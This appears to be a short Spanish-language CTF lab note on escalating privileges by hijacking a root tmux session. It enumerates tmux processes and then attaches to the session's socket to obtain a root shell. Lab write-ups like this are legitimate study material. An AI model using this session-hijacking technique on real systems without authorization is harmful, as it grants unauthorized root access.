[Articulo que explica la vulnerabilidad](https://int0x33.medium.com/day-69-hijacking-tmux-sessions-2-priv-esc-f05893c4ded0)

# Enumeracion
Listar procesos activos
   ```bash
   ps aux | grep tmux
   ```
   ![[Valentine15.png]]


# Explotacion 
Ejecucion del comando que nos va a dar una shell como si fueramos root
[[ps faux y ps -eo]]
   ```bash
   sudo /usr/bin/tmux -S /.devs/dev_sess
   ```




